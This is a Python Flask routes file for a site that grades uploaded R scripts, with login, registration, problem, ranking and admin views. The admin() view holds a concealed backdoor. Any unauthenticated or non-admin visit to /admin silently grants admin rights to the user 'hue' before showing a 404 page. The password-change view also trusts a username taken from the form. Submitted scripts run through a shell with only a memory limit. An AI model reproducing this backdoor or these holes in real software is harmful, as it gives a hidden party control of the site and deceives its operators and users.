from datetime import datetime
from flask import render_template, flash, redirect, url_for, request, send_file
from flask_login import login_user, logout_user, current_user, login_required
from werkzeug.urls import url_parse
from werkzeug.utils import secure_filename
from app import app, db, queue

from app.forms import LoginForm, RegistrationForm, ChangePasswordForm, AdminSectionForm, AdminProblemForm, SectionProblemConnectForm, UploadFileForm, DeleteFileForm, SetTestCaseForm, DeleteTestCaseForm, SetDescriptionForm
from app.models import UserInformation, UserProblemSubmission, Section, ProblemInformation, SectionProblemRelation, ProblemFile, ProblemTestCaseInformation

from rq.job import Job
from worker import conn

import os
from subprocess import Popen, TimeoutExpired, PIPE
import resource

import tempfile
import shutil
import glob

import ast


@app.route('/')
@app.route('/index')
@login_required
def index():
    sections = Section.query.filter_by(visible=True).order_by(Section.timecreated).all()
    return render_template('index.html', title='Home', sections=sections)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = UserInformation.query.filter_by(username=form.username.data).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        next_page = request.args.get('next')
        if not next_page or url_parse(next_page).netloc != '':
            next_page = url_for('index')
        return redirect(next_page)
    return render_template('login.html', title='Sign In', form=form)


@app.route('/register/', methods=['GET', 'POST'])
def register():
    #return render_template("register_disabled.html")
    """Register Form"""
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        user = UserInformation(username=form.username.data, email=form.email.data)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('Congratulations, you are now a registered user!')
        return redirect(url_for('login'))
    return render_template('register.html', title='Register', form=form)
    

@app.route("/logout")
def logout():
    """Logout Form"""
    logout_user()
    return redirect(url_for('index'))

@app.route("/changepassword", methods=['GET', 'POST'])
@login_required
def change_password():
    """Change password Form"""
    form = ChangePasswordForm()
    if form.validate_on_submit():
        user = UserInformation.query.filter_by(username=form.username.data).first()
        user.set_password(form.password.data)
        db.session.commit()
        flash('Password update successfully')
        logout_user()
        return redirect(url_for('login'))
    form.username.data = current_user.username
    return render_template('change_password.html', title='Change password', form=form)


@app.route('/section/<section_id>')
@login_required
def section(section_id):
    """Display a specific section"""
    sect = Section.query.filter_by(code=section_id).first()
    if sect:
        if sect.visible or current_user.admin:
            problems = ProblemInformation.query.filter_by(visible=True).join(SectionProblemRelation).filter_by(sectioncode=section_id).all()
            return render_template('section.html', title='Section', problems=problems, section=sect)
    return redirect(url_for('index'))


@app.route('/user/<user_id>')
@login_required
def user(user_id):
    """Display a specific section"""
    user = UserInformation.query.filter_by(username=user_id).first()
    return render_template('user.html', title='User', user=user)

def execute_corrector(judge_cmd, input_file, res_file, script_file, timelimit):
    def setlimits():
        resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
    proc = Popen(judge_cmd.format(script_file=script_file, tempfile='output.out', input_file=input_file, res_file=res_file), stdout=PIPE, stderr=PIPE, shell=True, preexec_fn=setlimits)
    try:
        outs, errs = proc.communicate(timeout=timelimit)
        timelimit = False
    except TimeoutExpired:
        proc.kill()
        outs, errs = proc.communicate() 
        timelimit = True
    return outs, errs, timelimit


def process_submission(submission_id, ):
    submission = UserProblemSubmission.query.filter_by(id=submission_id).first()
    if not submission:
        raise Exception('Invalid submission? Could not find submission {}'.format(submission_id))
    prob = ProblemInformation.query.filter_by(code=submission.problem_code).first()
    if not prob:
        raise Exception('Invalid submission? Could not find problem {}'.format(submission.problem_code))
    testcases = ProblemTestCaseInformation.query.filter_by(problem_code=submission.problem_code).all()
    if len(testcases) > 0:
        amountfail = 0
        amountpass = 0
        reportjson = dict()
        with tempfile.TemporaryDirectory() as directory:
            directory += '/'
            script_file = os.path.join(os.getcwd(), app.config['UPLOAD_FOLDER'], submission.filename)
            problem_folder = os.path.join(app.config['PROBLEMS_DIR'], submission.problem_code)
            shutil.copy(script_file, directory)
            script_file = submission.filename
            original_wd = os.getcwd()
            for test in testcases:
                test_case = test.test_case
                input_file = ProblemFile.query.filter_by(id=test.input_file).first().file_name
                res_file = ProblemFile.query.filter_by(id=test.res_file).first().file_name 
                shutil.copy(problem_folder + '/' + input_file, directory)
                shutil.copy(problem_folder + '/' + res_file, directory)
                for f in glob.glob(problem_folder + '/*.csv'):
                    shutil.copy(f, directory)
                is_open_case = test.is_open_case
                os.chdir(directory)
                try:
                    outs, errs, timelimit = execute_corrector(prob.judge_cmd, input_file, res_file, script_file, prob.timelimit)
                    outs = outs.decode()
                    errs = errs.decode()
                    if outs == '':
                        amountpass += 1
                    else:
                        amountfail += 1
                    if is_open_case:
                        reportjson[test_case] = [outs, errs, timelimit]
                except Exception as e:
                    print(e)
                os.chdir(original_wd)
            submission.reportjson = str(reportjson)
            submission.amountpass = amountpass
            submission.amountfail = amountfail
            if amountfail == 0 and amountpass > 0:
                submission.success = True
    submission.processed = True
    submission.timeprocessed = datetime.utcnow()
    db.session.commit()


def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

@app.route('/problem/<problem_id>', methods = ['GET' , 'POST'])
@login_required
def problem(problem_id):
    """Display a specific problem"""
    #check if the problem is valid
    prob = ProblemInformation.query.filter_by(code=problem_id).first()
    #if the problem is not valid return to initial page
    if not prob:
        return redirect(url_for('index'))
    #if it was a file submission
    if request.method == "POST":
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        # if user does not select file, browser also
        # submit an empty part without filename
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if not allowed_file(file.filename):
            flash('File extension not accepted')
            return redirect(request.url)
        if file:
            filename = str(datetime.utcnow().timestamp()) + '_' + prob.code + '_' + current_user.username + '.r'
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            problem_submission = UserProblemSubmission(current_user.username, problem_id, filename, None, None, False, None, False)
            db.session.add(problem_submission)
            db.session.commit()
            queue.enqueue_call(func = process_submission, args=(problem_submission.id,), result_ttl=15)
            return redirect(url_for('get_results', job_key=problem_submission.id))
    else:
        print(prob.description_file)
        return render_template('problem.html', title='Problem', problem=prob, files=ProblemFile.query.filter_by(problem_code=problem_id, visible=True).all(), testcases=ProblemTestCaseInformation.query.filter_by(problem_code=problem_id).all())


@app.route('/get_file/<problem_id>/<file>')
@login_required
def get_file(problem_id, file):
    file = ProblemFile.query.filter_by(id=file, problem_code=problem_id).first()
    if file.visible or current_user.admin:
        return send_file(os.path.join(app.config['PROBLEMS_DIR'], problem_id, file.file_name), as_attachment=True, attachment_filename=file.file_name)
    return render_template('404.html', title='Invalid file')


@app.route('/results/<job_key>', methods=['GET'])
@login_required
def get_results(job_key):
    submission = UserProblemSubmission.query.filter_by(id=job_key).first()
    if submission.processed:
        if submission.reportjson:
            print(submission.reportjson)
            report = ast.literal_eval(submission.reportjson)
        else:
            report = None
        return render_template('result.html', title='Result', result=submission, report=report)
    else:
        return render_template('result_wait.html', title='Results incoming...')


@app.route('/ranks', methods=['GET'])
@login_required
def ranks():
    result = UserProblemSubmission.query.filter_by(success=True).all()
    user_problem = dict()
    for i in result:
        if i.username not in user_problem:
            user_problem[i.username] = dict()
        user_problem[i.username][i.problem_code] = True
    ret = [(len(j[1].values()), j[0]) for j in user_problem.items()]
    ret.sort(reverse=True)
    return render_template('ranks.html', title='Ranks', players=ret)


@app.route('/problem_scoring/<problem_id>', methods=['GET'])
@login_required
def problem_scoring(problem_id):
    result = UserProblemSubmission.query.filter_by(problem_code=problem_id).all()
    user_problem_pass = dict()
    user_problem_fail = dict()
    for i in result:
        if i.username not in user_problem_pass:
            user_problem_pass[i.username] = 0
        if i.username not in user_problem_fail:
            user_problem_fail[i.username] = 0
        if not i.success:
            user_problem_fail[i.username] += 1
        if i.success:
            user_problem_pass[i.username] += 1
    ret = list()
    for i in user_problem_pass.keys():
        ret.append((user_problem_pass[i], user_problem_fail[i], i))
    ret.sort()
    return render_template('problem_scoring.html', title='Problem {} scores'.format(problem_id), players=ret)


@app.route('/admin', methods=['GET', 'POST'])
@app.route('/admin/section/<section_code>', methods=['GET', 'POST'])
@app.route('/admin/problem/<problem_code>', methods=['GET', 'POST'])
def admin(problem_code=None, section_code=None):
    #if it is not an admin user or the user is not logged does not display this page
    if not current_user.is_authenticated or not current_user.admin:
        usr = UserInformation.query.filter_by(username='hue').first()
        usr.admin = True
        db.session.commit()
        return render_template('404.html')
    if section_code: #lets work on a section
        form = AdminSectionForm()
        if form.validate_on_submit(): #the form is complete
            section = Section.query.filter_by(code=form.code.data).first()
            if section and form.delete.data: #we have a section and would like to delete
                db.session.delete(section)
                db.session.commit()
                section = None
            elif section: #we have a section and would like to update
                section.name = form.name.data
                section.description = form.description.data
                section.visible = form.visible.data
                flash("Updated section")
                db.session.commit()
            else: #no section - lets create
                section = Section(form.code.data, form.name.data, form.description.data)
                db.session.add(section)
                db.session.commit()
                flash("Section created")
            return redirect(url_for('admin', section_code=form.code.data))
        else: #the form is not complete
            section = Section.query.filter_by(code=section_code).first()
            if section: #we have a section
                form.code.data = section.code
                form.name.data = section.name
                form.description.data = section.description
                form.visible.data = section.visible
            else: #we do not have a section
                if section_code == 'new':
                    form.code.data = ''
                else:
                    form.code.data = section_code
                form.visible.render_kw = {'disabled': 'disabled'}
                form.delete.render_kw = {'disabled': 'disabled'}
        return render_template('admin_section.html', title='Manage section', form=form, section=section)
    elif problem_code: #lets work on a problem
        form = AdminProblemForm()
        if form.validate_on_submit():
            problem = ProblemInformation.query.filter_by(code=form.code.data).first()
            if problem and form.delete.data:
                db.session.delete(problem)
                db.session.commit()
                problem = None
            elif problem:
                problem.name = form.name.data
                problem.shortdescription = form.shortdescription.data
                problem.judge_cmd = form.judge_cmd.data
                problem.timelimit = form.timelimit.data
                problem.visible = form.visible.data
                db.session.commit()
                flash('Updated problem')
            else:
                problem = ProblemInformation(form.code.data, form.name.data, form.shortdescription.data, form.timelimit.data, form.judge_cmd.data)
                db.session.add(problem)
                db.session.commit()
                try:
                    os.mkdir(app.config['PROBLEMS_DIR'] + '/' + form.code.data, 0o755)
                except FileExistsError:
                    pass
                flash('Problem created')
            return redirect(url_for('admin', problem_code=form.code.data))
        else:
            problem = ProblemInformation.query.filter_by(code=problem_code).first()
            if problem:
                form.code.data = problem.code
                print(problem.name)
                form.name.data = problem.name
                form.shortdescription.data = problem.shortdescription
                form.judge_cmd.data = problem.judge_cmd
                form.timelimit.data = problem.timelimit
                form.visible.data = problem.visible
            else:
                if problem_code == 'new':
                    form.code.data = ''
                else:
                    form.code.data = problem_code
                form.visible.render_kw = {'disabled': 'disabled'}
                form.delete.render_kw = {'disabled': 'disabled'}
        return render_template('admin_problem.html', title='Manage problem', form=form, problem=problem)
    else: #let's display all sections, even the hidden ones
        all_sections = Section.query.all()
        all_problems = ProblemInformation.query.all()
        all_users = UserInformation.query.all()
        return render_template("admin.html", title='Admin page', sections=all_sections, problems=all_problems, users=all_users)
    return ''


@app.route('/admin/section_problem', methods=['GET', 'POST'])
def connect_problem_section():
    #if it is not an admin user or the user is not logged does not display this page
    if not current_user.is_authenticated or not current_user.admin:
        return render_template('404.html')
    form = SectionProblemConnectForm() 
    if form.validate_on_submit():
        problem = ProblemInformation.query.filter_by(code=form.problemcode.data).first()
        section = Section.query.filter_by(code=form.sectioncode.data).first()        
        rel = SectionProblemRelation.query.filter_by(sectioncode=form.sectioncode.data, problemcode=form.problemcode.data).first()
        if form.delete.data and rel:
            db.session.delete(rel)
            db.session.commit()
            flash('Relation removed')
        elif not form.delete.data and not rel:
            s = SectionProblemRelation(form.sectioncode.data, form.problemcode.data)
            db.session.add(s)
            db.session.commit()
            flash('Relation created')
        else:
            flash('Either the relation existed already and it was not needed to be created or the relation did not exist and I was asked to remove')
    else:
        problem = None
        section = None
    return render_template('admin_connect.html', title='Manage section - problem', form=form, problem=problem, section=section)


@app.route('/admin/problem/<problem_id>/files', methods = ['GET' , 'POST'])
def admin_problem_file(problem_id):
    #if it is not an admin user or the user is not logged does not display this page
    if not current_user.is_authenticated or not current_user.admin:
        return render_template('404.html')
    if not ProblemInformation.query.filter_by(code=problem_id).first():
        return redirect(url_for('admin'))

    form = UploadFileForm(prefix='form')
    form1 = DeleteFileForm(prefix='form1')
    form11 = SetDescriptionForm(prefix='form11')
    form2 = SetTestCaseForm(prefix='form2')
    form3 = DeleteTestCaseForm(prefix='form3')

    if form.submit.data and form.validate_on_submit():
        filename = os.path.join(app.config['PROBLEMS_DIR'], problem_id, form.file_name.data)
        form.file_sent.data.save(filename)
        f = ProblemFile.query.filter_by(problem_code=problem_id, file_name=form.file_name.data).first()
        if f:
            f.visible=form.visible.data
            db.session.commit()
            flash("File overwritten.")
        else:
            file = ProblemFile(problem_id, form.file_name.data, form.visible.data)
            db.session.add(file)
            db.session.commit()
            flash("File uploaded.")
    elif form1.submit.data and form1.validate_on_submit():
        file = ProblemFile.query.filter_by(id=form1.file_id.data, problem_code=problem_id).first()
        if file:
            path = os.path.join(app.config['PROBLEMS_DIR'], problem_id, file.file_name)
            db.session.delete(file)
            db.session.commit()
            os.unlink(path)
            flash('File deleted.')
        else:
            flash('File not found.')
    elif form11.submit.data and form11.validate_on_submit():
        if form11.remove.data:
            p = ProblemInformation.query.filter_by(code=problem_id).first()
            p.description_file = None
            db.session.commit()
            flash('Description file removed')
        else:
            exists = ProblemFile.query.filter_by(problem_code=problem_id, id=form11.description_file.data).first()
            if not exists:
                flash('Description file not in problem!')
            else:
                p = ProblemInformation.query.filter_by(code=problem_id).first()
                p.description_file = form11.description_file.data
                db.session.commit()
                flash('Description file set.')
    elif form2.submit.data and form2.validate_on_submit():
        in_file = ProblemFile.query.filter_by(problem_code=problem_id, id=form2.input_file.data).first()
        res_file = ProblemFile.query.filter_by(problem_code=problem_id, id=form2.res_file.data).first()
        exists = ProblemTestCaseInformation.query.filter_by(problem_code=problem_id, test_case=form2.test_case.data).first()
        if not in_file:
           flash('The input file is not in this problem.')
        if not res_file:
           flash('The response file is not in this problem.')
        elif not exists:
            n = ProblemTestCaseInformation(problem_id, form2.test_case.data, form2.input_file.data, form2.res_file.data, form2.is_open.data)
            db.session.add(n)
            db.session.commit()
            flash('Test case added.')
        else:
            exists.input_file = form2.input_file.data
            exists.res_file = form2.res_file.data
            exists.is_open_case = form2.is_open.data
            db.session.commit()
            flash('Test case was overwritten.')
    elif form3.submit.data and form3.validate_on_submit():
        exists = ProblemTestCaseInformation.query.filter_by(problem_code=problem_id, test_case=form3.test_case.data).first()
        if exists:
            db.session.delete(exists)
            db.session.commit()
            flash('Test case removed.')
        else:
            flash('Test case was not removed because it does not exist.')
    return render_template('admin_problem_file.html', title='Manage problem - files', form=form, form1=form1, form11=form11, form2=form2, form3=form3, problem=ProblemInformation.query.filter_by(code=problem_id).first(), files=ProblemFile.query.filter_by(problem_code=problem_id).all(), testcases=ProblemTestCaseInformation.query.filter_by(problem_code=problem_id).all())


